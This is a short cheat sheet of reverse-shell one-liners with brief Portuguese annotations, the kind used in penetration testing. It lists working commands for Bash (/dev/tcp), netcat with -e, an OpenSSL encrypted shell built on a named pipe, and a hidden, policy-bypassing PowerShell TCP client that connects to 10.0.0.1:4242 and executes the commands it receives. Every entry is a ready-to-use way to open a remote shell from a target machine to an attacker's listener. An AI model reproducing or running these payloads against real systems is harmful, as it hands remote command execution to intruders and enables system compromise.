##### Bash
```
bash -i >& /dev/tcp/[ip]/[porta] 0>&1
```


##### NC

```
nc -vnlp [porta] : Abre porta pra listen

nc [ip] [porta] -e [commando]

Comandos: /bin/[ba]sh, cmd.exe
```


##### OpenSSL
```
**SERVER**
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port [porta]

**CLIENT**
mkfifo /tmp/backpipe; /bin/bash -i < /tmp/backpipe 2>&1 | openssl s_client -quiet -connect [ip]:[porta] > /tmp/backpipe; rm /tmp/backpipe

```



##### Powershell
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```
mini-reverse.ps1 do Kali
```